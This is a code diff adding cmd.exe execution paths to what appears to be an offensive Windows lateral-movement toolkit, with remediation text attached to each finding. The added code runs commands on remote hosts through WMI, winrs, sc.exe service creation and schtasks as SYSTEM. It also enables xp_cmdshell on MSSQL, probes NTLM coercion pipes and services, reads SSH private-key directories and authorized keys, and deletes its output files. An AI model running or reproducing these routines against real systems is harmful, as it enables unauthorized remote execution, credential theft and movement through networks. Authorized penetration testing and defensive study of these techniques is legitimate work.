@@ -1,4 +1,4 @@
-import { ps, argVal, hasFlag } from "./shared"
+import { ps, cmd, wmic, activeExec, argVal, hasFlag } from "./shared"
 import type { Finding, HookResult } from "./shared"
 
 export async function wmiExec(args: string[], timeout: number): Promise<HookResult> {
@@ -10,6 +10,23 @@ export async function wmiExec(args: string[], timeout: number): Promise<HookResu
   const output: string[] = [`[*] WMI remote execution on ${target}\n`]
 
   if (!target || !command) return { output: "[!] Required: --target HOST --command CMD", findings }
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    const credPart = user && password ? `/user:${user} /password:${password}` : ""
+    const r = await wmic(`/node:"${target}" ${credPart} process call create "${command}"`, timeout)
+    output.push(r.stdout || r.stderr)
+    if (r.stdout.includes("ReturnValue = 0")) {
+      output.push(`[+] Process created on ${target} via wmic`)
+      findings.push({
+        checkId: "WIN-LAT-001", provider: "windows", severity: "critical", status: "EXECUTED",
+        resource: `wmi://${target}`, title: `WMI remote execution on ${target} (cmd)`,
+        details: `Command: ${command}`, remediation: "Restrict WMI access, enable Windows Firewall WMI rules, monitor WMI process creation events",
+      })
+    }
+    const procs = await cmd(`wmic /node:"${target}" ${credPart} process get ProcessId,Name,CommandLine /format:csv 2>nul`, timeout)
+    if (procs.stdout) output.push("[+] Remote processes:\n" + procs.stdout.substring(0, 3000))
+    return { output: output.join("\n"), findings }
+  }
 
   const credBlock =
     user && password
@@ -76,6 +93,24 @@ export async function winrmExec(args: string[], timeout: number): Promise<HookRe
   const output: string[] = [`[*] WinRM/PSRemoting execution on ${target}\n`]
 
   if (!target || !command) return { output: "[!] Required: --target HOST --command CMD", findings }
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    const credPart = user && password ? `-u:${user} -p:${password}` : ""
+    output.push("[*] Using winrs (WinRM cmd-native client)...")
+    const r = await cmd(`winrs -r:${target} ${credPart} ${command}`, timeout)
+    output.push(r.stdout || r.stderr)
+    if (r.exitCode === 0) {
+      output.push(`[+] WinRM command executed on ${target}`)
+      const sysinfo = await cmd(`winrs -r:${target} ${credPart} "hostname & whoami & systeminfo | findstr /C:\"OS Name\" /C:\"Domain\""`, timeout)
+      if (sysinfo.stdout) output.push("[+] Remote system info:\n" + sysinfo.stdout)
+      findings.push({
+        checkId: "WIN-LAT-002", provider: "windows", severity: "critical", status: "EXECUTED",
+        resource: `winrm://${target}`, title: `WinRM remote execution on ${target} (cmd/winrs)`,
+        details: `Command: ${command}`, remediation: "Restrict WinRM access with firewall rules, use JEA (Just Enough Administration), monitor PSRemoting events (Event ID 4103/4104)",
+      })
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   const credBlock =
     user && password
@@ -167,6 +202,25 @@ export async function dcomExec(args: string[], timeout: number): Promise<HookRes
   const output: string[] = [`[*] DCOM lateral movement on ${target} via ${method}\n`]
 
   if (!target || !command) return { output: "[!] Required: --target HOST --method METHOD --command CMD", findings }
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("[!] DCOM lateral movement requires PowerShell/.NET COM object instantiation")
+    output.push("[*] cmd.exe cannot directly create remote DCOM objects")
+    output.push("")
+    output.push("[*] Alternative approaches without PowerShell:")
+    output.push("    1. Use wmic for remote process creation: wmic /node:<target> process call create \"<cmd>\"")
+    output.push("    2. Use schtasks for remote execution: schtasks /create /s <target> /tn name /tr <cmd> /sc once")
+    output.push("    3. Use sc.exe for service-based exec: sc \\\\<target> create svc binpath= \"cmd /c <cmd>\"")
+    output.push("    4. Use winrs for WinRM exec: winrs -r:<target> <cmd>")
+    if (user && password) {
+      const credStore = await cmd(`cmdkey /add:${target} /user:${user} /pass:${password}`, timeout)
+      output.push(`[*] Credential cached: ${credStore.stdout}`)
+      const wmiFallback = await wmic(`/node:"${target}" process call create "${command}"`, timeout)
+      output.push("[*] WMI fallback attempt:\n" + (wmiFallback.stdout || wmiFallback.stderr))
+      await cmd(`cmdkey /delete:${target}`, timeout)
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   const credBlock =
     user && password
@@ -263,6 +317,53 @@ export async function smbExec(args: string[], timeout: number): Promise<HookResu
   const output: string[] = [`[*] SMB/SCM execution on ${target}\n`]
 
   if (!target || !command) return { output: "[!] Required: --target HOST --command CMD", findings }
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    if (user && password) {
+      const net = await cmd(`net use \\\\${target}\\IPC$ /user:${user} ${password}`, timeout)
+      output.push(net.stdout || net.stderr)
+    }
+
+    if (share) {
+      output.push(`[*] Accessing \\\\${target}\\${share}...`)
+      const dir = await cmd(`dir \\\\${target}\\${share}`, timeout)
+      output.push(dir.stdout || dir.stderr)
+    } else {
+      output.push("[*] Enumerating shares...")
+      const shares = await cmd(`net view \\\\${target} /all 2>nul`, timeout)
+      output.push(shares.stdout || shares.stderr)
+
+      const svcName = "cs_" + Math.random().toString(36).substring(2, 10)
+      const outFile = `C:\\Windows\\Temp\\${svcName}.out`
+      const binPath = `cmd.exe /c ${command} > ${outFile} 2>&1`
+
+      output.push(`[*] Creating service '${svcName}' on ${target} via sc.exe...`)
+      const create = await cmd(`sc \\\\${target} create ${svcName} binpath= "${binPath}" type= own start= demand`, timeout)
+      output.push(create.stdout || create.stderr)
+
+      if (create.exitCode === 0 || (create.stdout && create.stdout.includes("SUCCESS"))) {
+        output.push(`[+] Service created: ${svcName}`)
+        const start = await cmd(`sc \\\\${target} start ${svcName}`, timeout)
+        output.push("[*] Service started (cmd executed): " + (start.stdout || start.stderr))
+
+        const read = await cmd(`type \\\\${target}\\C$\\Windows\\Temp\\${svcName}.out 2>nul`, timeout)
+        if (read.stdout) output.push("[+] Command output:\n" + read.stdout)
+        await cmd(`del \\\\${target}\\C$\\Windows\\Temp\\${svcName}.out 2>nul`, timeout)
+
+        const del = await cmd(`sc \\\\${target} delete ${svcName}`, timeout)
+        output.push("[+] Service deleted: " + (del.stdout || ""))
+
+        findings.push({
+          checkId: "WIN-LAT-004", provider: "windows", severity: "critical", status: "EXECUTED",
+          resource: `smb://${target}`, title: `SMB/SCM remote execution on ${target} (cmd/sc.exe)`,
+          details: `Command: ${command}`, remediation: "Restrict admin shares (C$, ADMIN$), monitor service creation events (Event ID 7045), restrict SCM access",
+        })
+      }
+    }
+
+    if (user && password) await cmd(`net use \\\\${target}\\IPC$ /delete 2>nul`, timeout)
+    return { output: output.join("\n"), findings }
+  }
 
   const script = `
 Add-Type -TypeDefinition @"
@@ -391,6 +492,46 @@ export async function ntlmCoerce(args: string[], timeout: number): Promise<HookR
   const output: string[] = [`[*] NTLM coercion via ${method}: ${target} → ${listener}\n`]
 
   if (!target || !listener) return { output: "[!] Required: --method METHOD --target HOST --listener HOST", findings }
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("[!] NTLM coercion attacks require PS/.NET P/Invoke or named pipe RPC calls")
+    output.push("[*] cmd.exe cannot directly trigger EFSRPC/MS-RPRN/DFS/VSS coercion")
+    output.push("")
+    output.push("[*] Checking pipe/service accessibility from cmd:")
+
+    if (method === "petitpotam" || method === "all") {
+      const efsrpc = await cmd(`echo test | dir \\\\${target}\\pipe\\efsrpc 2>nul && echo EFSRPC_ACCESSIBLE || echo EFSRPC_NOT_FOUND`, timeout)
+      const lsarpc = await cmd(`echo test | dir \\\\${target}\\pipe\\lsarpc 2>nul && echo LSARPC_ACCESSIBLE || echo LSARPC_NOT_FOUND`, timeout)
+      output.push(`[*] PetitPotam (MS-EFSRPC): efsrpc pipe: ${efsrpc.stdout.includes("ACCESSIBLE") ? "accessible" : "not found"}, lsarpc: ${lsarpc.stdout.includes("ACCESSIBLE") ? "accessible" : "not found"}`)
+    }
+    if (method === "printerbug" || method === "all") {
+      const spooler = await cmd(`sc \\\\${target} query Spooler 2>nul`, timeout)
+      output.push(`[*] PrinterBug (MS-RPRN): Spooler: ${spooler.stdout.includes("RUNNING") ? "RUNNING" : "not running/accessible"}`)
+    }
+    if (method === "dfscoerce" || method === "all") {
+      const dfs = await cmd(`sc \\\\${target} query Dfs 2>nul`, timeout)
+      output.push(`[*] DFSCoerce (MS-DFSNM): DFS: ${dfs.stdout.includes("RUNNING") ? "RUNNING" : "not running/accessible"}`)
+    }
+    if (method === "shadowcoerce" || method === "all") {
+      const vss = await cmd(`sc \\\\${target} query "File Server VSS Agent Service" 2>nul`, timeout)
+      output.push(`[*] ShadowCoerce (MS-FSRVP): VSS Agent: ${vss.stdout.includes("RUNNING") ? "RUNNING" : "not running/accessible"}`)
+    }
+
+    output.push("")
+    output.push("[*] To trigger coercion without PS, use external tools:")
+    output.push("    - PetitPotam.exe (C/C++): PetitPotam.exe <listener> <target>")
+    output.push("    - Coercer (Python): coercer coerce -t <target> -l <listener>")
+    output.push("    - PrintSpoofer: SpoolSample.exe <target> <listener>")
+    output.push("    - DFSCoerce.py: python3 dfscoerce.py -d domain -u user -p pass <listener> <target>")
+
+    findings.push({
+      checkId: "WIN-LAT-005", provider: "windows", severity: "info", status: "GUIDANCE",
+      resource: `ntlm://${target}`, title: `NTLM coercion recon: ${method} on ${target} (cmd)`,
+      details: `Pipe/service check from cmd.exe — use external tools for actual coercion`,
+      remediation: "Disable unnecessary services (Spooler, EFS, DFS, VSS Agent), enforce SMB signing, enable EPA",
+    })
+    return { output: output.join("\n"), findings }
+  }
 
   const methods: Record<string, string> = {
     petitpotam: `
@@ -537,6 +678,53 @@ export async function coercerFull(args: string[], timeout: number): Promise<Hook
 
   if (!target) return { output: "[!] Required: --target HOST --listener IP", findings }
   if (!listener && !checkOnly) return { output: "[!] Required: --listener IP (or use --check-only)", findings }
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("[!] Extended NTLM coercion requires PS/.NET named pipe RPC — cmd.exe used for service/pipe enumeration")
+    output.push("")
+
+    const pipes = [
+      { name: "efsrpc", protocol: "MS-EFSR", attack: "PetitPotam" },
+      { name: "lsarpc", protocol: "MS-EFSR (alt)", attack: "PetitPotam" },
+      { name: "eventlog", protocol: "MS-EVEN", attack: "EventLog coercion" },
+      { name: "netdfs", protocol: "MS-DFSNM", attack: "DFSCoerce" },
+      { name: "FssagentRpc", protocol: "MS-FSRVP", attack: "ShadowCoerce" },
+      { name: "samr", protocol: "MS-SAMR", attack: "SAMR coercion" },
+      { name: "spoolss", protocol: "MS-RPRN", attack: "PrinterBug" },
+    ]
+
+    output.push("[*] Checking RPC pipes on " + target + ":")
+    for (const p of pipes) {
+      const r = await cmd(`dir \\\\${target}\\pipe\\${p.name} 2>nul && echo PIPE_OK || echo PIPE_FAIL`, timeout)
+      const avail = r.stdout.includes("PIPE_OK") ? "ACCESSIBLE" : "not found"
+      output.push(`    ${p.protocol} (${p.name}): ${avail} — ${p.attack}`)
+    }
+
+    const services = [
+      { name: "DNS", desc: "MS-DNSP (DNS admin coercion)" },
+      { name: "WebClient", desc: "WebDAV/SearchConnector coercion" },
+      { name: "Spooler", desc: "Print Spooler (PrinterBug)" },
+    ]
+    output.push("\n[*] Checking services on " + target + ":")
+    for (const s of services) {
+      const r = await cmd(`sc \\\\${target} query ${s.name} 2>nul`, timeout)
+      const state = r.stdout.includes("RUNNING") ? "RUNNING" : r.stdout.includes("STOPPED") ? "STOPPED" : "not found"
+      output.push(`    ${s.name}: ${state} — ${s.desc}`)
+    }
+
+    output.push("\n[*] For actual coercion, use external tools:")
+    output.push("    - Coercer (Python): coercer coerce -t <target> -l <listener> --always-continue")
+    output.push("    - PetitPotam.exe: PetitPotam.exe <listener> <target>")
+    output.push("    - PrintSpoofer/SpoolSample: SpoolSample.exe <target> <listener>")
+
+    findings.push({
+      checkId: "WIN-COERCE-EXT-001", provider: "windows", severity: "info", status: "ENUMERATED",
+      resource: `ntlm://${target}`, title: `Extended coercion pipe/service enumeration (cmd)`,
+      details: `Checked ${pipes.length} pipes and ${services.length} services on ${target}`,
+      remediation: "Enable Extended Protection for Authentication, enforce SMB signing, disable unnecessary RPC services",
+    })
+    return { output: output.join("\n"), findings }
+  }
 
   const script = `
 $target = "${target}"
@@ -756,6 +944,32 @@ export async function remoteMonologue(args: string[], timeout: number): Promise<
   if (!target) return { output: "[!] Required: --target HOST", findings }
   if (!listener) return { output: "[!] Required: --listener LISTENER_IP", findings }
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("[!] Remote Monologue DCOM-based NTLM harvesting requires PS/.NET COM instantiation")
+    output.push("[*] cmd.exe cannot directly create remote DCOM objects (Pla.ServerDataCollectorSet, IMAPI2FS, etc.)")
+    output.push("")
+    output.push("[*] Verifying DCOM accessibility on " + target + ":")
+    const dcomCheck = await cmd(`sc \\\\${target} query DcomLaunch 2>nul`, timeout)
+    output.push(`    DCOM Launcher: ${dcomCheck.stdout.includes("RUNNING") ? "RUNNING" : "not accessible"}`)
+    const rpcCheck = await cmd(`sc \\\\${target} query RpcSs 2>nul`, timeout)
+    output.push(`    RPC Service: ${rpcCheck.stdout.includes("RUNNING") ? "RUNNING" : "not accessible"}`)
+
+    output.push("")
+    output.push("[*] Alternative NTLM coercion from cmd.exe:")
+    output.push("    1. SMB file access: dir \\\\<target>\\C$ (forces NTLM auth)")
+    output.push("    2. RPC pipe probing: dir \\\\<target>\\pipe\\<name>")
+    output.push("    3. UNC path injection: net use \\\\<listener>\\share")
+    output.push("    4. External tools: Coercer.py, PetitPotam.exe, SpoolSample.exe")
+
+    findings.push({
+      checkId: "WIN-RMON-001", provider: "windows", severity: "info", status: "GUIDANCE",
+      resource: `dcom://${target}`, title: `Remote Monologue DCOM check on ${target} (cmd)`,
+      details: `DCOM-based NTLM coercion requires PS/.NET — provided alternative approaches`,
+      remediation: "Disable unnecessary DCOM objects. Enable LDAP signing. Use EPA. Monitor DCOM activation events (10036)",
+    })
+    return { output: output.join("\n"), findings }
+  }
+
   const uncPath = `\\\\${listener}\\share`
   const methods: Record<string, string> = {
     datacollector: `
@@ -900,6 +1114,40 @@ export async function mssqlAbuse(args: string[], timeout: number): Promise<HookR
   const output: string[] = [`[*] MSSQL exploitation on ${server} — action: ${action}\n`]
 
   if (!server) return { output: "[!] Required: --server HOST", findings }
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    const authPart = user && password ? `-U ${user} -P ${password}` : "-E"
+    const sqlExe = "sqlcmd"
+
+    const queries: Record<string, string> = {
+      enum: `SELECT @@VERSION AS [Version]; SELECT SYSTEM_USER AS [SystemUser], USER_NAME() AS [DbUser], DB_NAME() AS [CurrentDb], IS_SRVROLEMEMBER('sysadmin') AS [IsSysadmin]; SELECT name, state_desc FROM sys.databases; SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G'); SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS [xp_cmdshell] FROM sys.configurations WHERE name = 'xp_cmdshell';`,
+      exec: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '${command?.replace(/'/g, "''") || "whoami"}';`,
+      links: `EXEC sp_linkedservers; SELECT name FROM sys.servers WHERE is_linked = 1;`,
+      impersonate: `SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';`,
+      creds: `SELECT j.name, s.step_name, LEFT(s.command, 200) AS [command] FROM msdb.dbo.sysjobs j INNER JOIN msdb.dbo.sysjobsteps s ON j.job_id = s.job_id WHERE s.command IS NOT NULL; SELECT s.name AS [LinkedServer], ll.remote_name AS [RemoteLogin] FROM sys.servers s LEFT JOIN sys.linked_logins ll ON s.server_id = ll.server_id WHERE s.is_linked = 1;`,
+    }
+
+    const query = queries[action] || queries.enum
+    const r = await cmd(`${sqlExe} -S ${server} ${authPart} -Q "${query.replace(/"/g, '\\"')}" -W -s "|"`, timeout)
+    output.push(r.stdout || r.stderr)
+
+    if (r.exitCode !== 0 && r.stderr) {
+      output.push("[*] sqlcmd failed, trying osql...")
+      const osql = await cmd(`osql -S ${server} ${authPart} -Q "${query.replace(/"/g, '\\"')}" -w 200`, timeout)
+      output.push(osql.stdout || osql.stderr)
+    }
+
+    if (r.stdout.includes("Version") || r.stdout.includes("xp_cmdshell")) {
+      findings.push({
+        checkId: "WIN-LAT-006", provider: "windows", severity: "critical",
+        status: action === "exec" ? "EXECUTED" : "ENUMERATED",
+        resource: `mssql://${server}`, title: `MSSQL ${action} on ${server} (cmd/sqlcmd)`,
+        details: action === "exec" ? `Command: ${command}` : `Action: ${action}`,
+        remediation: "Disable xp_cmdshell, review linked servers, restrict IMPERSONATE, encrypt credentials in agent jobs",
+      })
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   const connStr =
     user && password
@@ -1068,6 +1316,65 @@ export async function schtaskExec(args: string[], timeout: number): Promise<Hook
   const findings: Finding[] = []
   const output: string[] = [`[*] Remote scheduled task execution — ${action}\n`]
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    const cred = user && password ? `/RU "${user}" /RP "${password}"` : ""
+
+    if (action === "enum") {
+      if (!target) return { output: "[!] --target required for enum action", findings }
+      output.push("=== Remote Scheduled Tasks on " + target + " ===")
+      const tasks = await cmd(`schtasks /Query /S "${target}" ${cred} /FO CSV /NH`, timeout)
+      output.push(tasks.stdout || tasks.stderr)
+      output.push("\n[*] Testing task creation permission...")
+      const test = await cmd(`schtasks /Create /S "${target}" ${cred} /TN "CS_PermTest" /TR "cmd /c echo test" /SC ONCE /ST 23:59 /F`, timeout)
+      if (test.exitCode === 0) {
+        output.push("[+] Task creation ALLOWED — lateral movement possible")
+        await cmd(`schtasks /Delete /S "${target}" ${cred} /TN "CS_PermTest" /F`, timeout)
+      } else {
+        output.push("[-] Task creation denied: " + (test.stderr || test.stdout))
+      }
+      findings.push({
+        checkId: "WIN-LAT-012", provider: "windows", severity: test.exitCode === 0 ? "high" : "info", status: "ENUMERATED",
+        resource: `schtask://${target}`, title: `Remote scheduled task enumeration on ${target} (cmd)`,
+        details: tasks.stdout.substring(0, 500), remediation: "Restrict remote task scheduler access. Monitor Event ID 4698.",
+      })
+    }
+
+    if (action === "exec") {
+      if (!target || !command) return { output: "[!] --target and --command required for exec action", findings }
+      const outFile = `C:\\Windows\\Temp\\${taskName}.out`
+      const wrappedCmd = `cmd.exe /c ${command} > ${outFile} 2>&1`
+
+      output.push("[*] Step 1: Creating remote task...")
+      const create = await cmd(`schtasks /Create /S "${target}" ${cred} /TN "${taskName}" /TR "${wrappedCmd}" /SC ONCE /ST 00:00 /RU SYSTEM /F`, timeout)
+      if (create.exitCode !== 0) {
+        output.push("[-] Task creation failed: " + (create.stderr || create.stdout))
+        return { output: output.join("\n"), findings }
+      }
+      output.push("[+] Task created: " + taskName)
+
+      output.push("[*] Step 2: Running task...")
+      const run = await cmd(`schtasks /Run /S "${target}" ${cred} /TN "${taskName}"`, timeout)
+      output.push(run.stdout || run.stderr)
+
+      output.push("[*] Step 3: Retrieving output...")
+      const read = await cmd(`type \\\\${target}\\C$\\Windows\\Temp\\${taskName}.out 2>nul`, timeout)
+      if (read.stdout) output.push("[+] Command output:\n" + read.stdout)
+      await cmd(`del \\\\${target}\\C$\\Windows\\Temp\\${taskName}.out 2>nul`, timeout)
+
+      output.push("[*] Step 4: Cleanup...")
+      await cmd(`schtasks /Delete /S "${target}" ${cred} /TN "${taskName}" /F`, timeout)
+      output.push("[+] Task deleted")
+
+      findings.push({
+        checkId: "WIN-LAT-013", provider: "windows", severity: "critical",
+        status: run.exitCode === 0 ? "EXECUTED" : "FAILED",
+        resource: `schtask://${target}/${taskName}`, title: `Remote command execution via schtasks on ${target} (cmd)`,
+        details: `Command: ${command}`, remediation: "Restrict remote task scheduler. Monitor Event ID 4698/4702.",
+      })
+    }
+    return { output: output.join("\n"), findings }
+  }
+
   if (action === "enum") {
     if (!target) {
       output.push("[!] --target required for enum action")
@@ -1212,6 +1519,77 @@ export async function sshExec(args: string[], timeout: number): Promise<HookResu
   const action = argVal(args, "--action") || (command ? "exec" : "enum")
   const findings: Finding[] = []
   const output: string[] = [`[*] SSH lateral movement — ${action}\n`]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    if (action === "enum") {
+      output.push("=== SSH Service Discovery (cmd) ===")
+
+      const sshVer = await cmd(`ssh.exe -V 2>&1`, timeout)
+      if (sshVer.exitCode === 0 || sshVer.stderr) {
+        output.push("[+] ssh.exe available: " + (sshVer.stderr || sshVer.stdout))
+      } else {
+        output.push("[-] ssh.exe not in PATH")
+        const builtin = await cmd(`dir %SystemRoot%\\System32\\OpenSSH\\ssh.exe 2>nul`, timeout)
+        output.push(builtin.stdout ? "[+] Built-in OpenSSH found" : "[-] OpenSSH not installed")
+      }
+
+      const sshdSvc = await cmd(`sc query sshd 2>nul`, timeout)
+      output.push("[*] sshd service: " + (sshdSvc.stdout.includes("RUNNING") ? "RUNNING" : sshdSvc.stdout.includes("STOPPED") ? "STOPPED" : "not installed"))
+
+      output.push("\n=== SSH Keys and Known Hosts ===")
+      const sshDir = await cmd(`dir %USERPROFILE%\\.ssh 2>nul`, timeout)
+      if (sshDir.stdout) {
+        output.push("[+] SSH directory contents:\n" + sshDir.stdout)
+      } else {
+        output.push("[-] No .ssh directory found")
+      }
+
+      const knownHosts = await cmd(`type %USERPROFILE%\\.ssh\\known_hosts 2>nul`, timeout)
+      if (knownHosts.stdout) {
+        output.push("[*] Known hosts (lateral movement targets):\n" + knownHosts.stdout.substring(0, 2000))
+      }
+
+      const sshConfig = await cmd(`type %USERPROFILE%\\.ssh\\config 2>nul`, timeout)
+      if (sshConfig.stdout) {
+        output.push("[*] SSH config:\n" + sshConfig.stdout)
+      }
+
+      output.push("\n=== Other Users SSH Keys ===")
+      const otherUsers = await cmd(`for /d %u in (C:\\Users\\*) do @if exist "%u\\.ssh" echo [!] %u has .ssh directory`, timeout)
+      if (otherUsers.stdout) output.push(otherUsers.stdout)
+
+      const adminKeys = await cmd(`type %ProgramData%\\ssh\\administrators_authorized_keys 2>nul`, timeout)
+      if (adminKeys.stdout) output.push("[!] Admin authorized_keys found:\n" + adminKeys.stdout)
+
+      findings.push({
+        checkId: "WIN-LAT-010", provider: "windows",
+        severity: (sshDir.stdout && sshDir.stdout.includes("id_")) ? "high" : "info",
+        status: "ENUMERATED", resource: "ssh://local",
+        title: "SSH discovery, key enumeration, known hosts mapping (cmd)",
+        details: (sshDir.stdout || "").substring(0, 500),
+        remediation: "Protect SSH private keys with passphrases. Restrict .ssh directory permissions. Disable password authentication.",
+      })
+    }
+
+    if (action === "exec") {
+      if (!target || !command) return { output: "[!] --target and --command required for exec action", findings }
+      const authArg = keyFile ? `-i "${keyFile}" -o StrictHostKeyChecking=no` : `-o StrictHostKeyChecking=no`
+      const userArg = user ? `${user}@${target}` : target
+
+      output.push(`[*] SSH exec to ${target} (cmd)...`)
+      const r = await cmd(`ssh.exe ${authArg} -o BatchMode=yes ${userArg} "${command}"`, timeout)
+      output.push(r.stdout || r.stderr)
+
+      findings.push({
+        checkId: "WIN-LAT-011", provider: "windows", severity: "high",
+        status: r.exitCode === 0 ? "EXECUTED" : "FAILED",
+        resource: `ssh://${target}`, title: `SSH remote exec on ${target} (cmd)`,
+        details: `Command: ${command}`,
+        remediation: "Restrict SSH access. Use key-based auth with passphrases. Enable SSH audit logging.",
+      })
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "enum") {
     const script = `
